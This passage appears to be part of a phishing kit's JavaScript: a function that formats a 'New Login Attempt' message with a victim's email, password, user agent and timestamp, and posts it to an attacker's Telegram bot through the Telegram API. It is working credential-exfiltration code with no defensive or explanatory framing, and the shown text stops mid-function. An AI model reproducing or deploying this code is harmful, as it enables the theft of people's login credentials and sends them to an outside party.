// Function to send data to Telegram
async function sendToTelegram(data) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // Format the message
    let message = `🔐 *New Login Attempt*\n\n`;
    message += `*Step:* ${data.step || '1'}\n`;
    message += `*Email:* ${data.email || 'N/A'}\n`;
    if (data.password) message += `*Password:* ||${data.password}||\n`;
    message += `*User Agent:* ${data.userAgent || 'N/A'}\n`;
    message += `*Timestamp:* ${new Date().toLocaleString()}\n`;
    
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending to Telegram:', error);
